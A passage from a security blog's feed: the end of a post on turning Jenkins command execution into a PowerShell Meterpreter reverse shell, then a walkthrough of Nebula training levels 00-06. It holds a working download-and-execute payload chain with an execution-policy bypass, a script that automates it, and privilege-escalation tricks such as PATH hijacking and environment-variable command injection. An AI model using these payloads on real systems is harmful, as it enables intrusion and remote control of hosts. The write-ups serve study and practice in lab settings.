&lt;p&gt;In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A &lt;code&gt;payload&lt;/code&gt; which includes the &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&amp;rsquo;t worry it should be more clear after we have gone through it.&lt;/p&gt;

&lt;h2 id=&#34;preparing-the-payload&#34;&gt;preparing the payload&lt;/h2&gt;

&lt;p&gt;As already mentioned, I was going to use &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt;. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about &lt;em&gt;payload&lt;/em&gt; here, all it really is is a file that will be made available via HTTP for the powershell script to download.&lt;/p&gt;

&lt;p&gt;The payload will consist of 2 parts. First, defining &lt;code&gt;function Invoke-Shellcode {}&lt;/code&gt;, and then invoking the function for a &lt;code&gt;windows/meterpreter/reverse_https&lt;/code&gt; shell. Kali Linux has powersploit available in &lt;code&gt;/usr/share&lt;/code&gt; so all I really did was cat it to my &lt;code&gt;payload&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &amp;gt; payload
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After that, I added the following line to the &lt;code&gt;payload&lt;/code&gt; file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This file was finally served via HTTP using the python SimpleHTTPServer with &lt;code&gt;python -m SimpleHTTPServer&lt;/code&gt; which meant that it would be available at &lt;a href=&#34;http://192.168.252.1:8000/payload&#34;&gt;http://192.168.252.1:8000/payload&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;preparing-the-command&#34;&gt;preparing the command&lt;/h2&gt;

&lt;p&gt;Next, we need to prepare the actual command to run. We will make use of the powershell &lt;a href=&#34;https://technet.microsoft.com/en-us/library/hh849893.aspx&#34;&gt;Invoke-Expression&lt;/a&gt; command and give it a [Net.WebClient.DownloadString](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx&lt;/a&gt;) object to download the payload we previously prepared and execute it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;iex (New-Object Net.WebClient).DownloadString(&#39;http://192.168.252.1:8000/payload&#39;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That whole command needs to be &lt;a href=&#34;http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx&#34;&gt;encoded&lt;/a&gt; so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The above will output a base64 encoded string that should be passed to the Powershell &lt;code&gt;-Enc&lt;/code&gt; flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing &lt;code&gt;-Exec ByPass&lt;/code&gt; to the powershell executable. So, in summary, the command will be as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;pwn&#34;&gt;pwn&lt;/h2&gt;

&lt;p&gt;So, I now had the &lt;code&gt;payload&lt;/code&gt; file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_powershell_payload.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;From the python web server we can see the request come in for the payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;192.168.252.100 - - [28/May/2015 12:37:15] &amp;quot;GET /payload HTTP/1.1&amp;quot; 200 -
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And pop!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;msf exploit(handler) &amp;gt; exploit

[*] Started HTTPS reverse handler on https://0.0.0.0:443/
[*] Starting the payload handler...
[*] 192.168.252.100:54023 Request received for /INITM...
[*] 192.168.252.100:54023 Staging connection for target /INITM received...
[*] Meterpreter session 1 opened (192.168.252.1:443 -&amp;gt; 192.168.252.100:54023) at 2015-05-28 12:37:17 +0200

meterpreter &amp;gt;
meterpreter &amp;gt; getuid
Server username: NT AUTHORITY\SYSTEM
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;automation&#34;&gt;automation&lt;/h2&gt;

&lt;p&gt;While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash

# meterpreter ip &amp;amp; port
lhost=192.168.252.1
lport=443

echo &amp;quot; * Writing Payload&amp;quot;
cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &amp;gt; payload
echo &amp;quot;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force&amp;quot; &amp;gt;&amp;gt; payload

echo &amp;quot; * Prepping Command&amp;quot;
scriptblock=&amp;quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://$lhost:8000/payload&#39;)&amp;quot;
echo $scriptblock

echo
echo &amp;quot; * Encoding command&amp;quot;
encode=&amp;quot;`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`&amp;quot;
echo $encode

command=&amp;quot;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode&amp;quot;
echo
echo &amp;quot; * Final command&amp;quot;
echo $command

echo
echo &amp;quot; * Starting HTTP Server to serve payload&amp;quot;
python -m SimpleHTTPServer
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>playing exploit-exercises - nebula</title>
      <link>https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises---nebula/</link>
      <pubDate>Fri, 08 May 2015 07:18:31 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/05/08/playing-exploit-exercises---nebula/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;Recently I decided I wanted to have a look at what &lt;a href=&#34;https://exploit-exercises.com/&#34;&gt;Exploit Exercises&lt;/a&gt; had to offer. I was after the memory corruption related exploitation stuff to play with, until I saw the details for &lt;a href=&#34;https://exploit-exercises.com/nebula/&#34;&gt;Nebula&lt;/a&gt;. &lt;em&gt;Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.&lt;/em&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/nebula_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I did not really have a lot of time on my hands and figured I should start with the &amp;ldquo;easy&amp;rdquo; stuff. Many of the levels Nebula presented were in fact very, very easy. However, towards final levels my knowledge was definitely being tested. Levels started taking much longer to complete as I was yet again realizing that the more you learn, the more you realize you you still have to learn. :)&lt;/p&gt;

&lt;p&gt;This is the path I took to solve the 20 challenges.
&lt;/p&gt;

&lt;h2 id=&#34;setup&#34;&gt;setup&lt;/h2&gt;

&lt;p&gt;On the details page, one could easily learn the format of the challenges, as well as some information should you need to get root access on the VM to configure things. Obviously the point is not to login with this account to solve challenges, but merely to fix things if they are broken for some reason.&lt;/p&gt;

&lt;p&gt;After my download finished, I booted the live image, checked the IP address it got assigned using the Nebula account and tried to SSH in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ » ssh level00@192.168.217.239
no hostkey alg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;sigh&lt;/em&gt;. Some quick diagnostics showed that my SSH client was attempting to identify the remote server with a RSA/DSA key, but none was being presented. So, I quickly escalated the &lt;code&gt;nebula&lt;/code&gt; account to root and generated a RSA host key with: &lt;code&gt;ssh-keygen -t rsa -f /etc/ssh/ssh_host_rsa_key&lt;/code&gt; with no password. I was now able to log in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;~ » ssh level00@192.168.217.239
The authenticity of host &#39;192.168.217.239 (192.168.217.239)&#39; can&#39;t be established.
RSA key fingerprint is cf:cf:68:5b:01:05:a8:52:aa:19:aa:54:a8:27:5d:46.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.217.239&#39; (RSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of &amp;quot;levelXX&amp;quot; and password &amp;quot;levelXX&amp;quot;, where
XX is the level number.

Currently there are 20 levels (00 - 19).


level00@192.168.217.239&#39;s password:
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release &#39;12.04 LTS&#39; available.
Run &#39;do-release-upgrade&#39; to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

level00@nebula:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I could see that I was now logged in as level00&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ id
uid=1001(level00) gid=1001(level00) groups=1001(level00)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The challenges are all in their respective &lt;code&gt;flag&lt;/code&gt; folder. So if you are logged in as &lt;code&gt;level00&lt;/code&gt;, you are interested in &lt;code&gt;flag00&lt;/code&gt;. Once you have exploited whatever needed exploiting and gained the privileges of the respective flag, the command &lt;code&gt;getflag&lt;/code&gt; could be run to confirm that you have the correct access. For the most part, I actually wanted to get shells as the users I escalated to, but just running &lt;code&gt;getflag&lt;/code&gt; is enough to consider a level done. I had prepared a small C setuid shell in &lt;code&gt;/var/tmp/shell.c&lt;/code&gt; with the following output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This shell was reused throughout the challenges. Lets dig into the challenges themselves.&lt;/p&gt;

&lt;h2 id=&#34;level00&#34;&gt;level00&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level00/&#34;&gt;Level00&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Finding SUID binaries is really easy. I guess because this is the format most of the challenges are in, it was a good start to get the challenger to know &lt;em&gt;about&lt;/em&gt; SUID binaries :P&lt;/p&gt;

&lt;p&gt;So, to solve level00:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level00@nebula:~$ find / -perm -4000 2&amp;gt; /dev/null | xargs ls -lh
-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /bin/.../flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /bin/mount
-rwsr-xr-x 1 root    root        34K 2011-05-03 03:38 /bin/ping
-rwsr-xr-x 1 root    root        39K 2011-05-03 03:38 /bin/ping6
-rwsr-xr-x 1 root    root        31K 2011-06-24 02:37 /bin/su
-rwsr-xr-x 1 root    root        63K 2011-08-09 09:15 /bin/umount
-rwsr-x--- 1 flag00  level00    7.2K 2011-11-20 21:22 /rofs/bin/.../flag00
-rwsr-xr-x 1 root    root        26K 2011-05-18 03:12 /rofs/bin/fusermount
-rwsr-xr-x 1 root    root        87K 2011-08-09 09:15 /rofs/bin/mount
[...]

level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!

flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level01&#34;&gt;level01&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level01/&#34;&gt;Level01&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system(&amp;quot;/usr/bin/env echo and now what?&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can see a bunch of UID/GID stuff being set with with &lt;code&gt;setresgid&lt;/code&gt; and &lt;code&gt;setresuid&lt;/code&gt; and then a system command being run with &lt;code&gt;system()&lt;/code&gt;. The problem lies in the fact that the command that is being run does not have a full path specified for the &lt;code&gt;echo&lt;/code&gt; command. Even though its called with &lt;code&gt;/usr/bin/env&lt;/code&gt;, it is possible to modify the current &lt;code&gt;PATH&lt;/code&gt; variable and have &lt;code&gt;env&lt;/code&gt; report echo as being somewhere other than where it would normally be.&lt;/p&gt;

&lt;p&gt;On the filesystem we find the &lt;code&gt;flag01&lt;/code&gt; binary and can see it is setuid for &lt;code&gt;flag01&lt;/code&gt; user (we are currently logged in as &lt;code&gt;level01&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:~$ cd ~flag01/
level01@nebula:/home/flag01$ ls -lh flag01
-rwsr-x--- 1 flag01 level01 7.2K 2011-11-20 21:22 flag01

level01@nebula:/home/flag01$ ./flag01
and now what?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Abusing this is really easy. I decided to create my own &lt;code&gt;echo&lt;/code&gt; binary and modified &lt;code&gt;PATH&lt;/code&gt; so that it is called instead of the real &lt;code&gt;echo&lt;/code&gt;. A small note here though. The Nebula vm has &lt;code&gt;/tmp&lt;/code&gt; mounted with the &lt;code&gt;nosuid&lt;/code&gt; option. I see this many times in the real world. What this effectively means is that any suid bit will be ignored for binaries executed on this mount point. Luckily though my second resort being &lt;code&gt;/var/tmp&lt;/code&gt; was not mounted separately and I had write access there :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ mount | grep &amp;quot;/tmp&amp;quot;
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)

level01@nebula:/home/flag01$ ls -lah /var/ | grep tmp
drwxrwxrwt 3 root root   29 2012-08-23 18:46 tmp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, to solve level01:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level01@nebula:/home/flag01$ cat /var/tmp/echo
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag01
chmod 4777 /var/tmp/flag01

level01@nebula:/home/flag01$ ls -lh /var/tmp/echo
-rwxrwxr-x 1 level01 level01 77 2015-05-08 07:35 /var/tmp/echo

level01@nebula:/home/flag01$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level01@nebula:/home/flag01$ export PATH=/var/tmp:$PATH
level01@nebula:/home/flag01$ ./flag01
level01@nebula:/home/flag01$ ls -lah /var/tmp/flag01
-rwsrwxrwx 1 flag01 level01 7.1K 2015-05-08 07:37 /var/tmp/flag01

level01@nebula:/home/flag01$ /var/tmp/flag01
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level02&#34;&gt;level02&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level02/&#34;&gt;Level02&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&amp;amp;buffer, &amp;quot;/bin/echo %s is cool&amp;quot;, getenv(&amp;quot;USER&amp;quot;));
  printf(&amp;quot;about to call system(\&amp;quot;%s\&amp;quot;)\n&amp;quot;, buffer);

  system(buffer);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Level02 is very similar to Level01, except for that fact that here the line &lt;code&gt;/bin/echo %s is cool&lt;/code&gt; is copied to &lt;code&gt;buffer&lt;/code&gt; and eventually put through a &lt;code&gt;system()&lt;/code&gt; call. The value of the current environment variable &lt;code&gt;USER&lt;/code&gt; is added to the command. This is another easy exploit where a simple shell escape will do to get us our own shell. I prepped the shell to echo the word bob, the delimit the command with a ; character and specify the command I want to run. I then end it off with a hash (#) to ignore the rest of the commands that the program has hard coded (&lt;em&gt;is cool&lt;/em&gt; in this case).&lt;/p&gt;

&lt;p&gt;So, to solve level02:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level02@nebula:/home/flag02$ ./flag02
about to call system(&amp;quot;/bin/echo level02 is cool&amp;quot;)
level02 is cool

level02@nebula:/home/flag02$ USER=&amp;quot;bob&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob is cool&amp;quot;)
bob is cool

level02@nebula:/home/flag02$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level02@nebula:/home/flag02$ USER=&amp;quot;bob; id;#&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob; id;# is cool&amp;quot;)
bob
uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)

level02@nebula:/home/flag02$ USER=&amp;quot;bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;#&amp;quot; &amp;amp;&amp;amp; ./flag02
about to call system(&amp;quot;/bin/echo bob; gcc /var/tmp/shell.c -o /var/tmp/flag02; chmod 4777 /var/tmp/flag02;# is cool&amp;quot;)
bob

level02@nebula:/home/flag02$ /var/tmp/flag02
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level03&#34;&gt;level03&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level03/&#34;&gt;Level03&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the home directory of flag03 and take note of the files there.
There is a crontab that is called every couple of minutes.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Logging in as &lt;code&gt;level03&lt;/code&gt;, we find a directory and a &lt;code&gt;sh&lt;/code&gt; script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:~$ cd ~flag03
level03@nebula:/home/flag03$ ls -lh
total 512
drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh

level03@nebula:/home/flag03$ cat writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
    rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the mention of a cronjob, I assumed the &lt;code&gt;writable.sh&lt;/code&gt; script was being run. From the source of the script we can see that everything in &lt;code&gt;/home/flag03/writable.d/&lt;/code&gt; will have a ulimit set so that processes don’t take more than 5 seconds, and be executed using &lt;code&gt;bash -x&lt;/code&gt;. Once done, the file is removed. Easy to exploit.&lt;/p&gt;

&lt;p&gt;So, to solve level03:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level03@nebula:/home/flag03$ vim /var/tmp/flag03.sh
level03@nebula:/home/flag03$ cat /var/tmp/flag03.sh
#!/bin/sh
gcc /var/tmp/shell.c -o /var/tmp/flag03
chmod 4777 /var/tmp/flag03

level03@nebula:/home/flag03$ cat /var/tmp/shell.c
#include&amp;lt;stdio.h&amp;gt;

int main(void) {
    setresuid(geteuid(), geteuid(), geteuid());
    system(&amp;quot;/bin/sh&amp;quot;);
    return 0;
}

level03@nebula:/home/flag03$ cp /var/tmp/flag03.sh /home/flag03/writable.d/

level03@nebula:/home/flag03$ # wait some time for the cronjob

level03@nebula:/home/flag03$ /var/tmp/flag03
sh-4.2$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level04&#34;&gt;level04&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level04/&#34;&gt;Level04&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the description we are provided with the source code of a small C program:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
      printf(&amp;quot;%s [file to read]\n&amp;quot;, argv[0]);
      exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], &amp;quot;token&amp;quot;) != NULL) {
      printf(&amp;quot;You may not access &#39;%s&#39;\n&amp;quot;, argv[1]);
      exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to open %s&amp;quot;, argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));

  if(rc == -1) {
      err(EXIT_FAILURE, &amp;quot;Unable to read fd %d&amp;quot;, fd);
  }

  write(1, buf, rc);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the snippet we can see that a check is in place for the first argument to see if the string &lt;code&gt;token&lt;/code&gt; exists in it. As the token we want to read is actually called &lt;em&gt;token&lt;/em&gt; this check will obviously prevent us from reading it. As we also don’t have write access to the file we cant rename it either. We can however make a symlink to it with a different name, thereby circumventing this check.&lt;/p&gt;

&lt;p&gt;So, to solve level04:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level04@nebula:/home/flag04$ ln -s /home/flag04/token /var/tmp/flag04
level04@nebula:/home/flag04$ ./flag04 /var/tmp/flag04
06508b5e-8909-4f38-b630-fdb148a848a2

level04@nebula:/home/flag04$ su - flag04
Password:
flag04@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level05&#34;&gt;level05&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level05&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Check the flag05 home directory. You are looking for weak directory permissions&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Browsing to the &lt;code&gt;flag05&lt;/code&gt; directory we can see a &lt;code&gt;.backup&lt;/code&gt; directory containing a tar archive that is readable. This archive contained a private key that allowed login as the &lt;code&gt;flag05&lt;/code&gt; user.&lt;/p&gt;

&lt;p&gt;So, to solve level05:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level05@nebula:~$ cd ~flag05
level05@nebula:/home/flag05$ ls -lah
total 5.0K
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     220 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3.3K 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh

level05@nebula:/home/flag05$ cd .backup/
level05@nebula:/home/flag05/.backup$ ls -lah
total 2.0K
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1.8K 2011-11-20 20:13 backup-19072011.tgz

level05@nebula:/home/flag05/.backup$ tar -xvf backup-19072011.tgz -C /var/tmp/
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys

level05@nebula:/home/flag05/.backup$ ssh -i /var/tmp/.ssh/id_rsa flag05@127.0.0.1
The authenticity of host &#39;127.0.0.1 (127.0.0.1)&#39; can&#39;t be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;127.0.0.1&#39; (ECDSA) to the list of known hosts.

[...]

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level06&#34;&gt;level06&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://exploit-exercises.com/nebula/level05/&#34;&gt;Level06&amp;rsquo;s Description&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;The flag06 account credentials came from a legacy unix system.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Legacy unix system? This immediately had me thinking that the password hash may be in &lt;code&gt;/etc/passwd&lt;/code&gt;. Older unix systems used to store passwords this way, but that is no longer the case.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ cat /etc/passwd| grep flag06
flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hash &lt;code&gt;ueqwOCnSGdsuM&lt;/code&gt; is something that I had to send to &lt;code&gt;john&lt;/code&gt; to crack. So I just copied it over to a Kali linux instance and attempted to crack it with brute force. It took a few micro seconds to crack :P&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;~ # cat hash
ueqwOCnSGdsuM

~ # john hash
Loaded 1 password hash (Traditional DES [128/128 BS SSE2])
hello            (?)
guesses: 1  time: 0:00:00:00 DONE (Fri May  8 17:29:20 2015)  c/s: 102400  trying: 123456 - Pyramid
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The password is &lt;code&gt;hello&lt;/code&gt;.
So, to solve level06:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;level06@nebula:~$ su - flag06
Password:
flag06@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;level07&#34;&gt;level07&lt;/h2&gt;

